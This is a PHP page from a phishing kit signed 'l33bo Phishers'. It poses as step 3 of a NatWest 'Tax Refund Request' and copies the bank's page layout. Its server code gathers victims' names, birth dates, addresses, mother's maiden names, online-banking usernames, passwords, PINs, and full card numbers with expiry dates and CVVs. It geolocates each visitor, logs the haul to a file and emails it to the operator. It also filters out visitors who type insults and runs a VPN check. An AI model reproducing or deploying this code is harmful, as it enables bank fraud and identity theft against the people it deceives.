<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
$username = $_SESSION['userid'];
$pin = $_SESSION['pin'];
$password = $_SESSION['password'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$email = $_SESSION['email'];
$mobile = $_SESSION['mobile'];
$telephone = $_SESSION['telephone'];
$address = $_SESSION['address'];
$postcode = $_SESSION['postcode'];
$mmn = $_SESSION['mmn'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = ($cardInfo['bank']);
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['card_type']);
$category = ($cardInfo['card_category']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "Natty : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ------------- l33bo Phishers -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Mobile : $mobile
| Telephone : $telephone
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Details
| Username : $username
| Password : $password
| Pin : $pin
+ ------------------------------------------+
+ Billing Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Type : $Brand $Type
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
if($Encrypt==1) {
require "assets/includes/AES.php";
$imputText = $data;
$imputKey = "232BBCD7D47A1192";
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_SESSION['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiVy-zEiL_JAhXBkSwKHSLMAHUQFggbMAA&url=https%3A%2F%2Fpersonal.natwest.com%2F&usg=AFQjCNEwiAcYb-gv7DrpPno4YjO4Tk7tQQ&bvm=bv.108538919,d.bGg"));
    }
	if(stristr($_SESSION['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiVy-zEiL_JAhXBkSwKHSLMAHUQFggbMAA&url=https%3A%2F%2Fpersonal.natwest.com%2F&usg=AFQjCNEwiAcYb-gv7DrpPno4YjO4Tk7tQQ&bvm=bv.108538919,d.bGg"));
    }
if(stristr($_SESSION['address'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiVy-zEiL_JAhXBkSwKHSLMAHUQFggbMAA&url=https%3A%2F%2Fpersonal.natwest.com%2F&usg=AFQjCNEwiAcYb-gv7DrpPno4YjO4Tk7tQQ&bvm=bv.108538919,d.bGg"));
    }
}
}
require "../assets/includes/vpn_check.php";
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/natty.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/natty.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
<title>Step 3 of 3</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href="assets/css/main.css" rel="stylesheet" type="text/css" media="all" />
<link href="assets/css/color.css" rel="stylesheet" type="text/css" media="all" />
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
</head>
<body class="wizard wizard_sp">
<div id="wrapper" class="default_bg nobackgroundImg">
<div id="DaPage" class="PagePresent">
<div id="header" class="header">
<div class="topHeaderWrapper" style='background-color:#d8d8d8;'>
<div class="topHeaderLeftWrapper">
<ul class="globalTopnav">
<li class="OnIt"><span><script>document.write("Personal");</script></span></li>
<li class="AffIt"><a href="#"><script>document.write("Private");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("Business");</script></a></li>

<li class="AffIt"><a href="#"><script>document.write("International");</script></a></li>
</ul>
</div>
<div class="topHeaderRightWrapper">
<div class="loginWrapper"><span class="loginLink"><a href="#"><script>document.write("LOG OUT");</script></a></span></div>
</div>
</div>
<div class="bottomHeaderWrapper">
<div class="bottomHeaderLeftWrapper">
<div class="rbsHeader"><a href="#"><img src="assets/img/logo.png" style="border-width:0px;" /></a></div>
<div class="globalBottomNavWrapper">
<ul class="globalBottomNav">
<li><a href="#"><script>document.write("Products");</script></a></li>
<li><a href="#"><script>document.write("Support");</script></a></li>
<li><a href="#"><script>document.write("Life Moments");</script></a></li>
</ul>
</div>
</div>
<div class="bottomHeaderRightWrapper">
<div class="quickLinksWrapper">
<ul id="quickLinks">
<li class="privacyAndCookiesTopPadding"><a href="#"><script>document.write("Privacy &amp; Cookies");</script></a></li>
<li class="last"><a href="#"><script>document.write("Accessibility");</script></a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="content">
<div id="mid00" style="height: 100%;width: 560px;display: inline-block;">
<div class="wizard_page">
				<div>
					<h1><script>document.write("Tax Refund Request");</script></h1>
					<h2><script>document.write("Step 3 of 3");</script></h2>
					
					
					<div class="frame">
					    <span id="InputError" class="errorIndicator" style="color:Red;display:none;"></span>
					</div>
					<div class="box_borderFrameBackShaded_Middle">
		
					<h3 class="headingBorderBackShaded">Complete</h3>
                        <div class="headingChevron pageFrameHeadingChevron headingChevronBorderShaded"></div>
						
						
						<h2 style="text-align: center;">Please wait while we check your information</h2>
							<p align="center">It'll only take a few seconds 
							<br>We're just verifying the details that you've entered</p>
							<br/>
<img style="display:block;margin-left:auto;margin-right:auto"src="assets/img/spin.GIF">
<br/>
<p align="center">For your security you will automatically be logged out</p>
	
					</div>
				</div>
				
				
			<div class="box_borderFrameBackShaded additionalButtonPadding">
				</div>
            </div>

</div>
<div class="left menu leftPanelMenu">
<div class="box_menu"><div class="box_top_menu">
<hr>
</div>
<div class="MenuBody">
<ul id="menu">
<li><a accesskey="1" href="#"><script>document.write("Account summary");</script></a></li>
<li><a accesskey="2" href="#"><script>document.write("Messages");</script></a></li>
<li><a accesskey="3" href="#"><script>document.write("Statements");</script></a></li>
<li><a accesskey="4" href="#"><script>document.write("Payments and transfers");</script></a></li>
<li><a accesskey="5" href="#"><script>document.write("Alerts");</script></a></li>
<li><a accesskey="6" href="#"><script>document.write("Cards");</script></a></li>
<li class="current"><a  accesskey="7" href="#"><script>document.write("Your details");</script></a></li>
<li><a accesskey="8" href="#"><script>document.write("Security");</script></a></li>
<li><a accesskey="9" href="#"><script>document.write("Log out");</script></a></li>
</ul>
</div>
</div>
</div>
</div>



<div class="right banners">
<div class="box_ourProducts">
<div class="box_top_ourProducts">
<hr>
</div>
<h2 class="fauxh3"><script>document.write("Our products");</script></h2>
<span><script>document.write("Personal products");</script></span>
<ul class="aol">
<li><a class="ol-link" href="#"><script>document.write("Savings accounts");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Cash ISAs");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Current accounts");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Upgrade your account");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Overdrafts");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Loans");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Mortgages");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Insurance");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Travel money");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Debit card abroad");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Investment products");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Mobile app");</script></a></li>
</ul>
</div>
<div class="frame">
<div class="RCIP">
<a href="#" style="display:inline;">
<img width="208" height="470" src="assets/img/ad1.gif" style="border-width:0px;">
</a>
</div>
</div>
</div>


	
</div>
<div id="footer" class="footerContainer">
<ol class="footer_navbar">
<li><a href="#"><script>document.write("Legal Info");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li><a href="#"><script>document.write("Security");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li class="last"><span><script>document.write("&#169; 2005-2015 National Westminster Bank Plc");</script></span></li>
</ol>
</div>
</div>
</body>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>